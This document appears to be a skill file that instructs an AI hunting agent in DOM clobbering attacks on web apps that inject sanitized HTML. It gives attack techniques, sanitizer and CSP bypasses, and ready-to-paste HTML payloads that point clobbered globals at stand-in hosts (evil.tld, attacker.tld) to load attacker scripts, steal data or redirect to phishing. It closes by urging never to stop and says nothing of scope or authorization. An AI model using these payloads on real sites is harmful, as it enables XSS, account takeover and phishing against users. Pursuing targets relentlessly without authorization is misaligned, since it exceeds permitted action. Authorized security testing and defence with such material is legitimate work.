---
name: hunt-dom-clobbering
description: "Use this skill when you can inject HTML (markdown rendering, comment fields, admin templates, signature blocks, CMS pages) but script execution is blocked by sanitizers (DOMPurify default config, jsoup, Bleach, sanitize-html) or strict CSP. Load automatically when a sanitizer allows id/name attributes on common tags, when you find inline JS reading window.X / document.X / globalThis.X, when CSP forbids inline scripts but allows external scripts via window-loaded URLs. Only invoke if real impact potential exists — clobbering must reach a XSS sink, an open-redirect sink, or break a security check. Skip theoretical findings."
type: hunt
---

# Hunt: DOM Clobbering

When you have HTML injection but `<script>` is stripped, DOM clobbering turns benign tags into JavaScript objects that overwrite globals. Modern SPAs accidentally trust `window.config.url`, `document.currentScript.src`, or `window.URL` — all clobberable with `<form id=…>` and `<a name=…>` primitives.

## Crown Jewel Targets
- Markdown renderers that allow raw HTML (GitHub-style, Notion-style, comment systems)
- Rich-text editors saving HTML to DB (TinyMCE, CKEditor admin views)
- Sanitized email/notification HTML rendered in webmail or admin consoles
- CMS page templates / admin signature fields / profile bios accepting limited HTML
- DOMPurify with `ALLOWED_ATTR` including `id`/`name` (default behavior!)
- Static-site generators rendering user-content into trusted origin
- Apps with strict CSP (script-src 'self') that still trust `window.config` populated from a `<head>` tag

## Detection Signals
- Page contains injectable HTML, scripts are stripped but tags with `id`/`name` survive
- Inline JS references `window.X`, `document.X`, `globalThis.X` where X looks app-defined
- `document.currentScript`, `document.head.lastChild`, anchor-name lookups in JS
- Optional chaining `window?.config?.apiUrl` followed by `fetch()`, `eval()`, `<script src=>`
- Use of `Object.defineProperty(window, 'X', ...)` — NOT clobberable if `configurable:false`
- DOMPurify in source map without `SANITIZE_DOM:true` or with `ALLOW_DATA_ATTR` and stock attr list
- jQuery `$(selector)` where selector is `'#name'` and `name` is attacker-influenced

## Attack Techniques

1. **Single-element clobber (named access)**
   `document.X` and `window.X` resolve to an element if `<img name=X>` or `<form id=X>` exists.
   ```html
   <a id=test href="javascript:alert(1)">click</a>
   <!-- now document.test.href === "javascript:alert(1)" -->
   ```

2. **HTMLCollection trick (multiple same id)**
   Two elements share an `id` → access becomes an HTMLCollection. Use `name=` on each child to pick by index.
   ```html
   <a id=x>1</a><a id=x name=y href="//evil">2</a>
   <!-- document.x.y → the second anchor; .y.href → "//evil" -->
   ```

3. **Nested form/input clobber (overwrite object properties)**
   `<form>` exposes its named inputs as properties. Build a fake `config` object with multiple keys.
   ```html
   <form id=config>
     <input name=apiUrl value="https://evil.tld/steal">
     <input name=debug value="1">
   </form>
   <!-- window.config.apiUrl === input element; coerced to string === "https://evil.tld/steal" via toString of value? Use href trick -->
   ```

4. **Three-level chain (`a.b.c`)**
   ```html
   <form id=a><output id=b name=c><a id=c name=d href="javascript:alert(1)">x</a></output></form>
   <!-- a.b.c.d.href is the JS URL — used for window.config.api.endpoint patterns -->
   ```

5. **Anchor href coercion (string read)**
   `<a id=src href="https://evil.tld/x.js">` makes `document.src.toString() === "https://evil.tld/x.js"`. Any code doing `s = window.src + ''` or template literals on it gets the attacker URL.
   ```html
   <a id=cdn href="https://evil.tld/payload.js"></a>
   <!-- script that does: document.write('<script src='+cdn+'></scr'+'ipt>') -->
   ```

6. **Prototype clobbering via `document.cookie`**
   On older browsers and via `<meta http-equiv="set-cookie">` (largely fixed) — modern variant uses `<script type=application/json>` parsed into `Object.assign` for proto pollution. Adjacent technique.

7. **DOMPurify bypass (CVE-2024-45801 class)**
   DOMPurify <3.1.6 allowed nested form/iframe nesting confusion. Use `<template>`, `<noembed>`, `<noscript>`, or mXSS via mutation re-parse to smuggle attributes through.

8. **Clobber the sanitizer itself**
   ```html
   <form id=DOMPurify><input name=sanitize value=eval></form>
   <!-- If host code does DOMPurify.sanitize(x), and DOMPurify global was looked up via window['DOMPurify'], the clobber wins before the script tag loads. Race condition. -->
   ```

## Payloads

```html
<!-- Generic clobber probe — paste in any HTML-injection field, then run console: console.log(window.test, document.test) -->
<a id=test name=test href="https://attacker.tld/?clobbered">probe</a>
```

```html
<!-- Redirect window.location via clobbered URL config -->
<a id=urlConfig href="https://attacker.tld/phish"></a>
<!-- target code: location = window.urlConfig (string-coerced) -->
```

```html
<!-- Three-level: window.app.settings.endpoint -->
<form id=app>
  <output id=settings name=settings>
    <a id=endpoint name=endpoint href="https://attacker.tld/api"></a>
  </output>
</form>
```

```html
<!-- DOMPurify default-config bypass (id allowed): clobber currentScript -->
<form id=currentScript><input name=src value="https://attacker.tld/x.js"></form>
<!-- gadget: document.currentScript.src used to compute a base URL → loads attacker script -->
```

```html
<!-- Iframe-srcdoc smuggle to bypass attribute strippers that miss srcdoc parsing -->
<iframe srcdoc="<a id=cfg href='javascript:alert(1)'></a><script>top.postMessage(cfg.href,'*')</script>"></iframe>
```

## Bypass Methods
- Sanitizer strips `id` → try `name=`. Strips both → try `<form>`-grouped descendants (named-element access still works on form elements).
- DOMPurify `SANITIZE_NAMED_PROPS:true` blocks named props in some browsers — use HTMLCollection + numeric index `[0]`.
- `Object.defineProperty(window, 'cfg', {value:realCfg, configurable:false})` — UNCLOBBERABLE. Pivot to a clobberable sibling property.
- CSP `script-src 'self'` blocks inline → clobber a URL that becomes a `<script src=>` injected by host code (CSP allows self-origin or `*.cdn.com` you can pollute).
- Trusted Types blocks string-to-script — clobber the policy object name or look for trusted-types-name not used.
- SVG embeds allow `<a id=>` even when HTML strips it.
- Markdown renderers that pass HTML through "html-block" tokenizer often skip attribute filtering on rare tags (`<dialog>`, `<details>`, `<slot>`).

## Tools
- **DOM Invader (Burp Suite Pro)** — has "DOM clobbering" tab, auto-generates payloads for found sinks
- **dom-clobbering payload list:** https://github.com/wisec/domclob and Gareth Heyes' research (PortSwigger)
- **Hacktricks reference:** https://hacktricks.wiki/en/pentesting-web/dom-clobbering
- `grep -rE "window\.\w+|document\.\w+|globalThis\." --include="*.js" build/` on bundled JS
- Manual probe in DevTools: paste injection, then `console.log(window.X, document.X)` for each app-defined global
- **DOMPurify source review** for the version in use; check `default ALLOWED_ATTR` list

## Impact
- **Critical** — clobber → XSS on authenticated origin → ATO; clobber a script-src URL → arbitrary JS load under CSP
- **High** — bypass security check (e.g., clobber `isAdmin` test), redirect to phishing on victim browser, OAuth code theft via clobbered redirect_uri builder
- **Medium** — open redirect, info disclosure via clobbered fetch URL leak
- Without a downstream sink, a clobber is NOT a finding. You must demonstrate behavior change.

## Chain Potential
- DOM clobber + sanitizer mXSS = full XSS under CSP
- DOM clobber → window.URL change → SSO redirect_uri theft → OAuth ATO
- DOM clobber → fetch base URL change → CSRF-equivalent state change to arbitrary internal API
- DOM clobber → prototype pollution gadget loading → RCE in Electron / Node wrapper
- DOM clobber in admin email-template preview → admin session XSS → vertical privesc

## Fallback Chain
1. Enumerate every `window.X` / `document.X` / `globalThis.X` reference in the page JS and bundled chunks; mark which are user-content reachable.
2. For each candidate, craft single-element, HTMLCollection, and three-level form/output/anchor payloads; verify they overwrite the global in DevTools.
3. If sanitizer strips id/name, search for less-filtered tag/attribute pairs (SVG `<a id=>`, `<form>` descendants, `srcdoc=` smuggling, mXSS via mutation re-parse).
4. If pure clobbering fails, pivot to prototype pollution via JSON-parsed config, CSS-injection-based clobber, or chain with subdomain takeover to satisfy origin checks — Never stop because one technique failed.
